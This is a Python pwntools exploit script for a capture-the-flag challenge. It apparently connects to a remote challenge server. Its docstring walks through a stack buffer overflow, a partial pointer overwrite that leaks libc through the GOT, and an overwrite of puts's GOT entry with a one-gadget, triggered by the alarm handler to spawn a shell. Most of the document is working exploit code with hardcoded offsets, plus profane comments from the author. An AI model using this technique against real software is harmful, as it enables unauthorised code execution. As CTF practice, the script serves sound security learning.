#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF("./ld-linux-x86-64.so.2",checksec=False)

context.binary = binary

s = lambda x, r="": \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="": \
  p.sendlineafter(r, x) if r else p.sendline(x)
log_addr = lambda name, addr: \
  log.info("%s: %#lx"%(name, addr))
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('34.118.61.99', 10256)
else:
  p = binary.process([binary.path])
#  p = gdb.debug([binary.path])

"""
we have a bof -> partial overwrite of a string pointer on the stack, aligntment
leads us to 2-byte overwrite. more than enough, not only that were given the address of the
main function so we already have pie base.

we can overwrite the pointer to any offset on the GOT to leak libc, i chose puts. the program then
puts(got['puts']), and i guess with that we have code exec if we can hijack control flow via
one-gadget. glibc is ver. (Ubuntu GLIBC 2.39-0ubuntu8.6). then the program gives us an arbitrary
write by reading in an address via fmt spec "%lx", then fgets(ptr, 5, stdin).

this was the interesting part of this challenge, wasnt too technically difficult as it was
finnicky to work with. fgets blocks regardless of CRLF, though it will fill the IO buffer until
it is populated or flushed or such. but in the init routine, they disable buffering!

unsigned int sub_11E6()
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  signal(14, handler);
  return alarm(0xAu);
}

so each byte is committed immediately ! this means we are able to then, overwrite any GOT entry,
as well as stall until alarm() triggers the signal handler ! since the handler calls puts, we hijack
control flow !

my problem was getting lazy and NOT TESTING THE FUCKNIG ONE GASDGETS. holy shit im genuinely tweaking
out i was so confused as to why i was stuck on this. i was trying to find a way to re-enter main routine
and overwrite puts GOT entry with system. since we can pass any arbitrary ptr to puts, if we overwrite
with puts GOT with libc.system we only have to find a way to reference /bin/sh within 2-byte overwrite
of the binary.

oh well all good turns out it was just one gadget fml

void __fastcall main(int a1, char **a2, char **a3)
{
  signed __int64 v3; // rax
  signed __int64 v4; // rax
  signed __int64 v5; // rax
  char *s_1; // [rsp+8h] [rbp-48h] BYREF
  char buf[50]; // [rsp+10h] [rbp-40h] BYREF
  char *s; // [rsp+48h] [rbp-8h]

  printf("welcome, gift for today: %p\n", main);
  s = "quite interesting stuff you're saying";
  memset(buf, 0, sizeof(buf));
  read(0, buf, 0x3Au);
  buf[strcspn(buf, "\n")] = 0;
  if ( strlen(buf) > 0x32 )
  {
    puts("advanced hacking techniques detected");
    v3 = sys_exit(0);
  }

  // IMPORTANT PART HERE
  puts(s);
  

  __isoc23_scanf("%lx ", &s_1);
  if ( &printf < (int (**)(const char *, ...))s_1 )
  {
    puts("well atleast you tried");
    v4 = sys_exit(0);
  }
  fgets(s_1, 5, stdin);
  v5 = sys_exit(0);
  JUMPOUT(0x13A6);
}

"""

#pause()
base_addr = int(p.recvline().split(b': ')[1].strip(b'\n'),16)-0x00001265
#buf= b'\x00'*56+p16((base_addr & 0xffff) + 0x4070) + hex(base_addr+0x4000)[2:].encode()
#print(buf)
buf = b'\x00'*56 + ((base_addr+binary.got['puts']) & 0xffff).to_bytes(2, 'little')

#pause()
p.send(buf)

libc_base = int.from_bytes(p.recvline()[:-1],'little')-libc.sym['puts']
print(hex(base_addr), hex(libc_base))
one_gadget = libc_base + 0xef4ce

p.sendline(hex(base_addr+binary.got.puts).encode('ascii'))
p.send((one_gadget & 0xffffff).to_bytes(3,'little'))

# patched for brevity, didnt solve during ctf but i was so fucking close
# dude I FDUCKNIG GAVE UP AND DIDNT TRY ALL THE FUCKING ONE GAGDTETS
# no shot theres gonna just magically be a one gadget in the big 25 right? surely not right?
# ober for me.. im going to bed 
sleep(11)
p.interactive()
